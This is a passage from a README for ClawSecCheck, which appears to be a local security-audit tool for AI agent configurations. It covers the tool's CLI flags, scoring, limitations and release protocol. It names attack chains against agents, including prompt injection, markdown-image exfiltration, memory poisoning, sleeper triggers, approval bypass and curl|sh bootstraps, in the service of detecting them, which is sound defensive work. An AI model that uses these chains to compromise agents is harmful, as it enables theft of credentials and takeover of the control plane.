| RISK-12 | HIGH | Untrusted input + broad/unscoped write capability (B55) → filesystem tamper/persistence |
| RISK-13 | HIGH | Markdown-image exfil + writable memory/bootstrap = persistence / exfil |
| RISK-14 | HIGH | Wildcard-elevated sender + heartbeat → self-escalating autonomy loop |
| RISK-15 | HIGH | Untrusted context + browser SSRF to private network → metadata/credential exfiltration |
| RISK-16 | HIGH | RW workspace + host bind + plaintext gateway credential path → control-plane takeover |
| RISK-17 | HIGH | Conditional sleeper trigger + scheduled execution = delayed RCE |
| RISK-18 | HIGH | Untrusted context + cron + heartbeat = persistent autonomous foothold |

Each chain fires **only when every link has positive evidence** — no chain is invented from
absent or UNKNOWN data, so findings are evidence-gated, which keeps false positives low —
but this is a heuristic audit, not a guarantee; manual review is still required. The risk
engine does not change the deterministic A–F score; it surfaces separately so you can see
the worst-case paths at a glance without score inflation.

```bash
python3 audit.py --risk-paths       # print the highest-risk chains section only
python3 audit.py --json             # includes a "risk_paths" array in the JSON envelope
```

The `--risk-paths` output is also appended to the default report when any chain fires.

---

## ⚙️ CI / automation

```bash
python3 audit.py --sarif results.sarif      # write SARIF 2.1.0 locally (for GitHub Code Scanning upload step)
python3 audit.py --fail-under 70            # exit 1 if score < 70 (use in CI pipelines)
python3 audit.py --exit-code                # exit 1 if any unsuppressed FAIL finding
```

The SARIF file is written to the path you choose — ClawSecCheck never uploads it anywhere.
`--fail-under` and `--exit-code` do not change the default exit code (0) when omitted,
preserving backward compatibility.

---

## 🧰 More tools

**Quick CLI reference** (every flag is local & read-only against your config):

| Need | Command |
|---|---|
| Human report | `clawseccheck` |
| JSON / SARIF output | `clawseccheck --json` · `clawseccheck --sarif results.sarif` |
| Highest-risk chains | `clawseccheck --risk-paths` |
| Vet anything before install (type autodetected) | `clawseccheck --vet ./target` |
| Vet a skill / a plugin explicitly | `clawseccheck --vet-skill ./skill` · `clawseccheck --vet-plugin ./plugin` |
| Vet connected MCP servers | `clawseccheck --vet-mcp` |
| Reputation gate before download | `clawseccheck --vet-source clawhub:some-skill` |
| Active injection self-test | `clawseccheck --canary` · `clawseccheck --redteam` · `clawseccheck --dryrun` |
| All-in-one (audit + self-test + vet-mcp) | `clawseccheck --full` · add `--quiet` to collapse the appended sections to one-line summaries (lighter for CI logs) |
| Monitor drift / view timeline | `clawseccheck --monitor` · `clawseccheck --watch-log` |
| Attestation template / feed it back | `clawseccheck --ask` · `clawseccheck --attest attest.json` |
| Shareable card / SVG badge | `clawseccheck --card` · `clawseccheck --badge badge.svg` |
| Trend & percentile | `clawseccheck --trend` · `clawseccheck --percentile` |
| Accept a finding (show suppressed) | edit `.clawseccheckignore` · `clawseccheck --show-suppressed` |
| Skip native audit / host posture | `clawseccheck --no-native` · `clawseccheck --no-host` |
| Disable local history / age notice | `clawseccheck --no-history` · `clawseccheck --no-update-notice` |
| CI gate | `clawseccheck --fail-under 70` · `clawseccheck --exit-code` |
| Verify the engine itself | `clawseccheck --verify-self` |

```bash
python3 audit.py --next                    # print the "What you can do next" guidance block only
python3 audit.py --vet ./some-target       # vet a skill / plugin / MCP spec BEFORE installing it (type autodetected)
python3 audit.py --vet-skill ./some-skill  # force the skill engine (dir or SKILL.md)
python3 audit.py --vet-plugin ./some-plugin # force the plugin engine (root dir or openclaw.plugin.json)
python3 audit.py --vet ./some-skill --json # same, machine-readable risk dossier (grade + axes + findings); --sarif PATH for CI
python3 audit.py --vet-mcp                 # vet connected MCP servers for supply-chain risk BEFORE trusting them
python3 audit.py --vet-source npm:some-pkg # reputation gate on a slug/URL/package spec BEFORE anything is fetched
python3 audit.py --canary                   # active prompt-injection self-test (battle-tested)
python3 audit.py --redteam                   # a multi-scenario adversarial payload suite (incl. tool-poisoning, MCP-response injection, memory-poisoning, multi-agent, approval-bypass, dirty-to-exfil)
python3 audit.py --dryrun                     # runtime behavioral test (fake secret + fake tools; sources: email, web, MCP response, memory, subagent)
python3 audit.py --badge badge.svg          # write a shareable SVG grade badge
python3 audit.py --html report.html         # standalone HTML report (private — owner view)
python3 audit.py --verify-self               # SHA-256 of ClawSecCheck's own source (anti-tamper)
python3 audit.py --trend                     # print local score trend (stored in ~/.clawseccheck/history.jsonl)
python3 audit.py --percentile                # show where your score sits vs. an offline reference profile
python3 audit.py --history ~/.clawseccheck/history.jsonl  # custom history file path (default shown)
python3 audit.py --verbose                   # INFO-level log to stderr (secrets redacted)
python3 audit.py --debug                     # DEBUG-level log to stderr (secrets redacted)
python3 audit.py --log audit.log            # also write log to a local file
```

- **`--next`** prints the "What you can do next" guidance block on its own — runs the audit
  first, then shows only the prioritised next-steps list. Same content as the block appended to
  the default report; useful if you want to re-check recommendations without re-reading the full
  report.
- **`--vet TARGET`** vets *anything* before you install it: the artifact type is autodetected by
  content (a plugin manifest → plugin engine; an MCP server-spec JSON or configured server name →
  MCP engine; otherwise the skill engine) and printed to stderr as `detected type: …`.
  `--vet-skill` / `--vet-plugin` / `--vet-mcp` force a specific engine. For a skill it runs the
  full skill-content security scan —
  the B13 malware scan **plus** the content-security ring (capability-intent mismatch, cross-agent
  snooping, silent-instruction / jailbreak / forged-provenance directives) the full audit runs on
  installed skills (point it at a
  downloaded folder or `SKILL.md`; for a URL, clone it first, then vet the local copy). The output
  is a **risk dossier** — one A–F grade over five axes: **danger** (how dangerous to use), **build**
  (how it's built), **behavior** (how it thinks / behaves), **persistence** (what it stages for
  later), and **connections** (whom it reaches out to) — with an overall SAFE / SUSPICIOUS /
  DANGEROUS verdict. Add `--json` for the machine-readable dossier (grade + per-axis breakdown +
  findings), or `--sarif PATH` to drop a SARIF file for CI / code scanning; exit code is `1` on
  SUSPICIOUS/DANGEROUS so `--vet … || fail` gates an install pipeline.
- **`--vet-plugin PATH`** vets an OpenClaw plugin (root dir, `openclaw.plugin.json`, or an
  installed wrapper project) *before* you install it: manifest sanity, npm lifecycle scripts,
  floating dependency versions, native-executable stowaways, and skills entries escaping the
  plugin root — then dispatches bundled skills to the skill engine (they auto-load via
  `~/.openclaw/plugin-skills/`) and embedded MCP specs to the MCP engine. Plugin runtime code is
  JS/TS and is disclosed as outside this vet's static depth — review entry files before trusting.
- **`--vet-source SLUG|URL|PKG`** is the pre-download reputation gate: it judges a source's
  *identity* — `clawhub:<slug>`, `npm:<pkg>`, `pypi:<pkg>`, `git:host/owner/repo[@ref]`, or a
  URL — with zero network and nothing fetched. Exact match in the bundled known-compromised
  catalog → KNOWN-BAD (do not fetch, exit 1); typosquat of a well-known name / raw paste or
  bare-IP host / plaintext http / unpinned git ref → SUSPICIOUS (fetch only into an isolated
  quarantine, exit 1); otherwise the honest answer is *no known-bad record* (exit 0) — an
  identity check can never prove unseen code safe, so proceed via quarantine and run `--vet`
  on the fetched copy before installing.
- **`--vet-mcp`** vets every MCP server listed under `mcp.servers.*` for supply-chain risk
  *before* you trust it. Flags unpinned installs (`npx @latest`, unversioned packages), `curl|sh`
  bootstrap, plaintext-HTTP remote transports, env-variable secret passthrough, and overly broad
  OAuth scopes. Verdict per server: SAFE / SUSPICIOUS / DANGEROUS. Local and read-only — no
  network calls; it writes only a one-line coverage-freshness entry under `~/.clawseccheck/`
  (suppressed by `--no-history`). Targets the #1 agent supply-chain gap: most tools audit your
  skills but not the MCP servers wired into your agent.
- **`--canary`** emits a benign injection hidden in untrusted-looking content; feed it to your
  agent — if the agent echoes the token, it obeyed an injection (**VULNERABLE**), otherwise
  **RESISTANT**. This is the live "battle-tested" complement to the passive checks.
- **`--badge PATH`** writes a shields-style SVG (grade + score only) for your README / posts.
- **`--trend`** records the current audit result to a local append-only history file and prints
  a table of past scores with per-run arrows. History stays on your machine only.
- **`--percentile`** compares your score against a bundled offline reference profile — no network,
  no telemetry.
- **`--verbose` / `--debug` / `--log PATH`** activate structured local logging. Config values
  that may hold secrets are redacted before being written (practising ClawSecCheck's own B9/B10).

---

## 🗑️ Uninstall / cleanup

Everything ClawSecCheck ever writes lives under `~/.clawseccheck/` (score history, monitor
state/events, the coverage-freshness ledger) — nothing is scattered elsewhere and nothing is
ever uploaded. To remove that local store:

```bash
clawseccheck --purge          # lists the files, asks for confirmation, then deletes them
clawseccheck --purge --yes    # skip the prompt (for scripted uninstall)
```

`--purge` only ever touches its own known files (`history.jsonl`, `events.jsonl`, `state.json`,
`coverage.json`, plus their lock sidecars) — never a directory glob or recursive delete, so
anything else you keep under that path is untouched. It exits without deleting anything if you
answer no (or there's nothing to purge), and reports the count of files removed on success.
Removing the `clawseccheck` package/skill itself is a separate, normal uninstall step (e.g.
`pip uninstall clawseccheck` or removing the skill directory) — `--purge` only clears the local
data store.

---

## ✅ Baseline (accepting findings)

Reviewed a finding and decided it's acceptable? Add it to `~/.openclaw/.clawseccheckignore` —
one entry per line, either a check id (`B14`) or a finding fingerprint (`B14:ab12cd34`, shown
with `--show-suppressed`). Suppressed findings drop out of the **score**, the **report**, and
**monitor** alerts — so re-runs and `--monitor` stop nagging about things you've accepted.

```text
# ~/.openclaw/.clawseccheckignore
B14            # accept the egress-surface advisory
B12:1a2b3c4d   # accept one specific local-model finding
```

---

## 📊 Scoring

Weighted pass-rate (CRITICAL=10, HIGH=6, MEDIUM=3, LOW=1). **Honesty hard-caps:** any open
CRITICAL caps the score at 49, any open HIGH at 79 — you can never show an "A" with a critical
hole. Grades: A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50. The shareable card shows **only the
grade + score + trifecta ratio — never the findings** (sharing must not hand attackers your map).

---

## 📐 Public API & stability

The public contract below has been frozen since **1.0.0**. The breaking changes it anticipated
shipped in **2.0.0** (English-only output) and **3.0.0**; breaking any item below still requires
a major bump (SemVer). The freeze was cut after the attestation layer settled, an adversarial
review, and four field runs whose every finding was fixed or deliberately documented — with zero
hard false positives on real configs.

**Frozen contract (breaking these → major bump):**

- **CLI flags** and their documented meaning (`--json`, `--sarif`, `--card`, `--monitor`,
  `--fail-under`, `--exit-code`, …).
- **`--json` schema:** top-level `score`, `grade`, `capped`, `raw_score`, `trifecta`,
  `findings[]`, `next_actions[]`; each finding's `id`, `title`, `severity`, `status`, `detail`,
  `fix`, `framework`, `confidence`, `evidence`.
- **SARIF 2.1.0 output** shape (rule ids = check ids; `properties.confidence` + `.evidence`).
- **Public Python API:** `clawseccheck.audit(...) -> (ctx, findings, ScoreResult)` and the
  `Finding` field names.
- **Check IDs** (full generated catalog in [`docs/CHECKS.md`](docs/CHECKS.md)): an id, once shipped, keeps its meaning.
- **Status / confidence vocabularies:** `PASS|WARN|FAIL|UNKNOWN`, `HIGH|MEDIUM|LOW|ATTESTED`.
- **Scoring bands:** A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50; `UNKNOWN` never scores; advisory
  checks (`scored=False`) never move the grade.

**Explicitly experimental (may change without a major bump, by design):**

- The **attestation layer**: the `clawseccheck-attest/1` self-report schema (note the `/1` — it is
  explicitly versioned to evolve), the `--ask`/`--attest` flow, the B43 **verb→blast-radius
  taxonomy**, and B44. The `ATTESTED` confidence tier exists to mark exactly this: a self-report is
  weaker than a config fact, advisory, and never overrides one. Freezing the newest surface now
  would over-commit, so it stays flexible under this label until it has had broader real-world use.

---

## ⚖️ Limitations

- **Heuristic local audit, not a formal proof of safety.** ClawSecCheck inspects
  configuration text and known patterns; it cannot reason about all possible runtime
  behaviours or formally verify your agent's security properties.
- **Does not replace runtime red-teaming.** Static configuration analysis is a starting
  point, not a substitute for adversarial testing against a running agent.
- **The active self-tests and attestation are a self-report protocol, not an
  independently-verified check.** `--canary` / `--redteam` / `--dryrun` / `--self-test`
  emit deterministic test material for your agent to run and grade, and `--ask` / `--attest`
  ask your agent to declare its own capabilities — because the tool stays local and makes no
  network calls (it cannot spin up and observe an independent agent process). An
  already-compromised or jailbroken agent could therefore report `RESISTANT` or a benign
  capability set dishonestly. Treat these results as the subject grading its own homework,
  corroborated against the observable config/logs — not as proof.
- **May produce false positives and false negatives.** Evidence-gating keeps noise low,
  but heuristics can miss novel attack patterns and can misread edge-case configurations.
- **Read scope is bounded:** config, bootstrap markdown, installed-skill text, OpenClaw log
  files, agent session logs, host OS path-existence checks, and credential-store path presence
  — not an exhaustive scan of your filesystem, and credential-store contents are never read.
- **UNKNOWN is not PASS.** Unreadable files or unparseable configs are reported as
  UNKNOWN and excluded from the score, never silently marked safe.

---

## 🧪 Tests

A security tool should be heavily tested — so it is. The suite is **270+ test files / 3,900+ tests**, run on **Python 3.9 and 3.12** in CI alongside `ruff`. Tests are **offline and read-only** (no network, nothing written outside the test's temp dir); every check ships a **clean fixture** (no finding) *and* a **bad fixture** (the finding fires) plus explicit `UNKNOWN`-path coverage; and the release bar is **zero false-positive FAILs on real configs**.

```bash
python3 -m pytest -q       # full suite
ruff check .               # lint
```

The test suite and fixtures live in the [GitHub repo](https://github.com/gl0di/clawseccheck) — they are not bundled in the installed skill package.

---

## 🐛 Feedback & issues

Found a bug, a false positive, or have a question? Please open an issue:
<https://github.com/gl0di/clawseccheck/issues>

Maintained by gl0di <gllodi@gmail.com>.

---

## 📄 License

MIT — see [LICENSE](LICENSE).

## Release protocol (maintainers)

Before merging a release, follow this checklist:

### 1) Tests before release

- `python3 -m ruff check .`
- `python3 -m pytest`
- Run the most relevant test subset for the touched area if the full suite is too large for your CI window.

### 2) Documentation and protocol alignment

Update all of the following files (in order):

- `CHANGELOG.md`
- `README.md`
- `SECURITY.md`
- `SECURITY_MODEL.md`
- `SKILL.md`

### 3) Dependabot — merge open PRs

- `gh pr list --author app/dependabot` — merge all open dependabot PRs before tagging.

### 4) Pre-release review gate

- Re-read the release notes and verify that check IDs, remediation text, and examples match the implemented code/tests.
